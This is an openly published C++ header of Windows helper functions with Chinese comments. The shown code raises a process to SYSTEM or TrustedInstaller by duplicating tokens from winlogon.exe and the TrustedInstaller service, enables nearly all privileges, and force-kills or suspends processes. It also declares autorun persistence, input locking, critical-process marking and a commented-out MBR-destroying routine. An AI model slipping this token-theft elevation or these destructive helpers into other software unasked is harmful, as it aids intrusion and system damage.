/**********************************************************
@brief: 			 xbebhxx3函数合集
@license: 	         GPLv3
@version:  	         10.0
@remarks:            编译时加 -lgdi32 -lwsock32
@author:             xbehxx3
@date:               2022/3/28
@file:               x3-f.h
@copyright           Copyright (c) 2022 xbebhxx3, All Rights Reserved
***************************************/
//             ┏┓       ┏┓
//            ┏┛┻━━━━━━━┛┻┓
//            ┃     ?     ┃
//            ┃  ┳┛    ┗┳ ┃
//            ┃     ┻     ┃
//            ┗━┓       ┏━┛
//              ┃       ┗━━━━━━━━━━━━┓
//              ┃           神兽保佑  ┣┓
//              ┃       xbebhxx3       ┃
//              ┃   永无BUG！         ┏┛
//              ┗┓┓┏━┳┓┏━━━━━━┓┓┏━┳┓┏┛
//               ┃┫┫ ┃┫┫      ┃┫┫ ┃┫┫
//               ┗┻┛ ┗┻┛      ┗┻┛ ┗┻┛

//模板
/*********************************************
 *  @Sample usage   使用实例
 *  @brief           名字
 *  @param           函数参数
 *  @return          函数返回值描述
 *  @exception       函数抛异常描述
 *  @warning         函数使用中需要注意的地方
 *  @calls           被调用的函数
 *  @remarks         备注
 *  @note            详细描述
 *  @author          xbebhxx3
 *  @version         版本号
 *  @date            日期
 *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **********************************************/
#ifndef X3_F_H
#define X3_F_H
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <random>
#include <time.h>

using namespace std;

//权限操作
BOOL Debug();								//获得debug权限
BOOL EnableAllPrivilege();					//获得debug权限
BOOL IsProcessRunAsAdmin();					//判断是否以管理员权限运行
BOOL RunAsAdmin();							//以管理员权限重启当前进程
BOOL RunAsSystem();							//以System权限重启当前进程
BOOL RunAsTi();								//以TrustedInstaller权限重启当前进程
BOOL UseSystem(const char *exec);			// 以system权限打开可执行文件
BOOL UseTrustedInstaller(const char *exec); //以TrustedInstaller权限打开可执行文件
//进程操作
BOOL KillProcess(DWORD dwProcessID);					//结束进程
DWORD isProcess(const char *szImageName);				//判断进程是否存在 ,并返回进程id
char *GetProcesslocation(DWORD dwProcessID);			//获得进程路径
BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend);	//挂起进程
BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend); //设置/解除关键进程
BOOL CloseService(const char *service);					//停止服务
BOOL _StartService(const char *service);				//启动服务
void ListService();										//列出所有服务
//串口操作
class SerialPort //串口操作
{
public:
	BOOL open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // 打开串口
	void close();																								  //关闭串口
	int send(string dat);																						  //发送数据或写数据
	string receive();																							  //接收数据或读数据
private:
	int pHandle[16];
	char synchronizeflag;
};
//注册表操作
char *ReadReg(const char *path, const char *key);					 //读注册表
BOOL WriteReg(const char *path, const char *key, const char *value); //写注册表
BOOL DelReg(const char *path);										 //写注册表
BOOL DelRegValue(const char *path, const char *Value);				 //删除注册表项
BOOL AutoRun(const char *name, BOOL fSuspend);						 //设置开机自启
string CodeUrl(const string &URL);									 // Url编码
string DecodeUrl(const string &URL);								 // Url解码
char *x3code(char *c);												 // x3code加密
//改变颜色
void rgb_init();											  // RGB初始化
void rgb_set(int wr, int wg, int wb, int br, int bg, int bb); // RGB设置
//其他
BOOL lockkm(BOOL lockb);					   //锁定鼠标键盘 (需要管理员权限)
void mouxy(int &x, int &y);					   // 获得鼠标位置
void cls();									   //清屏
void delspace(string &s);					   // str删除空格
char *getIp();								   //获得当前ip
char *GetUser();							   //获得当前用户名
const char *GetSystemVersion();				   //获得系统版本
char *getCmdResult(const char *Cmd);		   //执行cmd命令并获得返回值
void OutoutMiddle(const char str[], int y);	   //居中输出
void full_screen(HWND hwnd);				   //全屏最大化
long long radom(long long min, long long max); //生成随机数
// void killmbr();//破坏mbr(very danger)默认注释,使用时删除注释
//权限操作开始

/**************************************************
 *  @brief         获得debug权限
 *  @Sample usage  Debug();
 *  @return        1成功，0失败
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2021/1/13
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL Debug()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //打开当前进程
	{
		CloseHandle(hToken); //关闭handle
		return 0;
	}

	//添加权限
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //添加权限
	{
		CloseHandle(hToken); //关闭handle
		return 0;
	}
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //判断是否成功
	{
		CloseHandle(hToken); //关闭handle
		return 0;
	}
	CloseHandle(hToken); //关闭handle
	return 1;
}

/**************************************************
 *  @brief         获得所有进程权限
 *  @Sample usage  EnableAllPrivilege();
 *  @return        1成功，0失败
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/11/15
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL EnableAllPrivilege()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //打开当前进程
	{
		CloseHandle(hToken); //关闭handle
		return 0;
	}
	//添加权限

	LUID luid;
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL value;
	value = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeCreateTokenPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeAssignPrimaryTokenPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeLockMemoryPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeIncreaseQuotaPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeUnsolicitedInputPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeMachineAccountPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeTcbPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSecurityPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeTakeOwnershipPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeLoadDriverPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSystemtimePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeProfileSingleProcessPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeIncreaseBasePriorityPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeCreatePagefilePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeCreatePermanentPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeBackupPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeRestorePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeShutdownPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeAuditPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSystemEnvironmentPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeChangeNotifyPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeRemoteShutdownPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeUndockPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeSyncAgentPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeEnableDelegationPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeManageVolumePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeImpersonatePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeCreateGlobalPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeTrustedCredManAccessPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeRelabelPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeIncreaseWorkingSetPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeTimeZonePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeCreateSymbolicLinkPrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	value = LookupPrivilegeValue(NULL, "SeDelegateSessionUserImpersonatePrivilege", &luid); //查找权限
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限

	CloseHandle(hToken); //关闭handle
	return value;
}

/**************************************************
 *  @brief         判断是否以管理员权限运行
 *  @return        1管理员,0不是
 *  @note          头文件: #include <Windows.h>
 *  @Sample usage  IsProcessRunAsAdmin();
 *  @author        xbebhxx3
 *  @version       2.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL IsProcessRunAsAdmin()
{
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //打开进程
	{
		CloseHandle(hToken); //关闭handle
		return 0;
	}
	//获得进程token
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) //获得进程token
		if (dwRetLen == sizeof(tokenEle))													 //判断
			bElevated = tokenEle.TokenIsElevated;

	CloseHandle(hToken);
	return bElevated; //返回
}

/**************************************************
 *  @brief         以管理员权限重启当前进程
 *  @return        0已经是管理员
 *  @note          头文件: #include <Windows.h>
 *  @Sample usage  RunAsAdmin();
 *  @Calls         IsProcessRunAsAdmin
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsAdmin()
{
	if (IsProcessRunAsAdmin() == 1) //判断是否是管理员，防止循环启动
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径

	ShellExecute(NULL, "runas", szFilePath, NULL, NULL, SW_SHOW); //用管理员权限打开
	exit(0);													  //退出当前进程，防止出现2个窗口
}

/**************************************************
 *  @brief         以System权限重启当前进程
 *  @return        1已经是System
 *  @note          头文件: #include <Windows.h>
 *  @Sample usage  RunAsTi();
 *  @Calls         IsProcessRunAsAdmin,UseSystem,GetUser
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/9/7
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsSystem()
{

	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //判断是否有管理员权限，判断是否是SYSTEM权限,防止循环重启
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
	UseSystem(szFilePath);							//以TrustedInstaller权限打开
	exit(0);										//退出防止2个窗口
}

/**************************************************
 *  @brief         以TrustedInstaller权限重启当前进程
 *  @return        1已经是TrustedInstaller
 *  @note          头文件: #include <Windows.h>
 *  @Sample usage  RunAsTi();
 *  @Calls         IsProcessRunAsAdmin,UseTrustedInstaller,GetUser
 *  @remarks       必须依赖IsProcessRunAsAdmin判断是否为管理员权限 必须依赖UseTrustedInstaller提权 必须依赖GetUser判断当前用户名
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/9/7
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsTi()
{

	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //判断是否有管理员权限，判断是否是SYSTEM权限,防止循环重启
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
	UseTrustedInstaller(szFilePath);				//以TrustedInstaller权限打开
	exit(0);										//退出防止2个窗口
}

/**************************************************
 *  @brief         以system权限打开可执行文件
 *  @param         exec:可执行程序路径
 *  @return        1成功,0失败
 *  @note          头文件: #include <Windows.h>
 *  @calls          Debug
 *  @Sample usage  UseSystem("c:\\windows\\system32\\cmd.exe");
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL UseSystem(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *转wchar_t

	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe"); //获得winlogon.exe的pid
	//声明之后需要的变量
	HANDLE tokenHandle = NULL;			//进程令牌
	HANDLE duplicateTokenHandle = NULL; //复制的令牌

	STARTUPINFO startupInfo; //创建进程所必须的结构
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL); //获取句柄进行调整权限

	Debug(); //获得debug权限

	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE); // 获取指定进程的句柄

	if (!processHandle)
		OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE); //绕过受微软的进程保护

	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle); // 获取指定进程的句柄令牌

	if (ImpersonateLoggedOnUser(tokenHandle)) //模拟登录用户的安全上下文
		RevertToSelf();
	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // 复制具有SYSTEM权限的令牌

	BOOL value = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // 创建指定令牌启动的进程
	CloseHandle(tokenHandle);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(processHandle); //关闭handle
	return value;
}

/**************************************************
 *  @brief         以TrustedInstaller权限打开可执行文件
 *  @param         exec:可执行程序路径
 *  @return        1成功,0失败
 *  @note          头文件: #include <Windows.h>
 *  @Sample usage  UseTrustedInstaller("cmd");
 *  @calls          Debug
 *  @author        xbebhxx3
 *  @version       5.0
 *  @date          2022/8/10
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL UseTrustedInstaller(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *转wchar_t

	Debug(); //获得debug权限

	HANDLE hSystemToken, IhDupToken;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //创建进程快照
	PROCESSENTRY32W pe = {0};
	pe.dwSize = sizeof(PROCESSENTRY32W);
	Process32FirstW(hSnapshot, &pe);
	while (Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe"))
		;																																	//当前进程是winlogon.exe
	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken); // 获取指定进程的句柄令牌
	SECURITY_ATTRIBUTES ItokenAttributes;
	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	ItokenAttributes.lpSecurityDescriptor = '\0';
	ItokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //打开令牌
	ImpersonateLoggedOnUser(IhDupToken);																						//创建进程所必须的结构
	//声明之后需要的变量
	HANDLE hTIProcess, hTIToken, hDupToken, hToken;
	LPVOID lpEnvironment;
	LPWSTR lpBuffer;
	SC_HANDLE hSCManager, hService;
	DWORD dwProcessId = 0;
	BOOL res = TRUE, started = TRUE;
	//启动TrustedInstaller服务并获得id
	hSCManager = OpenSCManager('\0', SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //打开TrustedInstaller服务
	SERVICE_STATUS_PROCESS statusBuffer = {0};
	DWORD bytesNeeded;
	while (dwProcessId == 0 && started && (res = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&statusBuffer), sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)))
	{
		switch (statusBuffer.dwCurrentState)
		{
		case SERVICE_STOPPED:
			started = StartServiceW(hService, 0, '\0'); //启动TrustedInstaller服务
		case SERVICE_STOP_PENDING:
			Sleep(statusBuffer.dwWaitHint); //等待服务启动
		case SERVICE_RUNNING:
			dwProcessId = statusBuffer.dwProcessId; //赋值进程id
		}
	}

	hTIProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId); //打开TrustedInstaller进程
	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);									  //获得TrustedInstaller进程Token

	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = '\0';
	tokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //复制带有TrustedInstaller权限的令牌
	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // 获取指定进程的句柄

	DWORD nBufferLength = GetCurrentDirectoryW(0, '\0');
	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]);
	GetCurrentDirectoryW(nBufferLength, lpBuffer); //输出操作系统路径

	STARTUPINFOW startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.lpDesktop = (LPWSTR)L"Winsta0\\Default";
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

	BOOL value = CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, '\0', wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //打开
	CloseHandle(hSystemToken);
	CloseHandle(hTIProcess);
	CloseHandle(hToken);
	CloseHandle(IhDupToken);
	CloseHandle(hSnapshot);
	CloseServiceHandle(hSCManager);
	CloseServiceHandle(hService); //关闭handle
	return value;
}

//进程操作开始

/**************************************************
 *  @brief          结束进程
 *  @param          szImageName:进程id
 *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage 	KillProcess(1000);
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL KillProcess(DWORD dwProcessID)
{
	HANDLE Token = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID); //打开进程
	
	if (!TerminateProcess(Token, 0) || Token == NULL)				   //杀死进程,如果未成功使用另一个方法
	{
		CloseHandle(Token);															 //关闭HANDLE
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //创建要结束进程的线程快照
		if (hSnapshot != INVALID_HANDLE_VALUE)
		{
			BOOL rtn = false;
			THREADENTRY32 te = {sizeof(te)};
			BOOL fOk = Thread32First(hSnapshot, &te);
			for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //查找线程
			{
				if (te.th32OwnerProcessID == dwProcessID)
				{
					HANDLE hThread = OpenThread(THREAD_TERMINATE, FALSE, te.th32ThreadID); //打开线程
					if (TerminateThread(hThread, 0))									   //结束线程
						rtn = true;
					CloseHandle(hThread); //关闭HANDLE
				}
			}
			CloseHandle(hSnapshot); //关闭HANDLE
			return rtn;
		}
		return false;
	}
	CloseHandle(Token); //关闭HANDLE
	return true;
}

/**************************************************
 *  @brief          判断进程是否存在 ,并返回进程id
 *  @param          szImageName:进程名
 *  @note           头文件: #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage 	isProcess("cmd.exe");
 * 	@return         0不存在 非0为进程id
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
DWORD isProcess(const char *szImageName)
{
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //获得进程列表
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //拍摄快照
	BOOL bRet = Process32First(hProcess, &pe);						   //检索快照中第一个进程信息

	while (bRet)
	{ //不是最后一个进程，历遍所有
		if (lstrcmp(szImageName, pe.szExeFile) == 0)
		{
			CloseHandle(hProcess);
			return pe.th32ProcessID; //返回进程id
		}

		bRet = Process32Next(hProcess, &pe); //下一个进程
	}
	CloseHandle(hProcess);
	return 0;
}

/**************************************************
 *  @brief          获得进程路径
 *  @param          szImageName:进程名
 *  @note           头文件: #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage   GetProcesslocation("cmd.exe");
 * 	@return  	    0不存在 非0为进程位置
 *  @calls          isProcess
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *GetProcesslocation(DWORD dwProcessID)
{
	HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID); // 创建进程快照
	MODULEENTRY32 *minfo = new MODULEENTRY32;
	Module32First(hModule, minfo); // 把第一个模块信息给 minfo
	CloseHandle(hModule);
	return minfo->szExePath;
}

/**************************************************
 *  @brief          挂起进程
 *  @param          dwProcessID:进程ID fSuspend:TRUE挂起,FALSE解除
 *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage   SuspendProcess(isProcess("cmd.exe"),1);
 *  @calls          Debug
 * 	@return     	1成功，0 失败
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
{
	BOOL ret = 1;

	Debug(); //获得debug权限

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //获得进程快照
	if (hSnapshot != INVALID_HANDLE_VALUE)										 //进程存在
	{
		THREADENTRY32 te = {sizeof(te)};
		BOOL fOk = Thread32First(hSnapshot, &te);		//打开进程
		for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //当前非最后一个进程，下一个
			if (te.th32OwnerProcessID == dwProcessID)
			{
				if (fSuspend)
				{
					if (SuspendThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //挂起
						ret = 0;
				}
				else
				{
					if (ResumeThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //取消挂起
						ret = 0;
				}
			}
	}
	CloseHandle(hSnapshot); //关闭快照
	return ret;
}

/**************************************************
 *  @brief          设置/解除关键进程
 *  @param          id:进程id fSuspend:1关键，0普通
 *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage 	CriticalProcess(1000,1);
 * 	@return      	1成功，0失败
 *  @calls          Debug
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
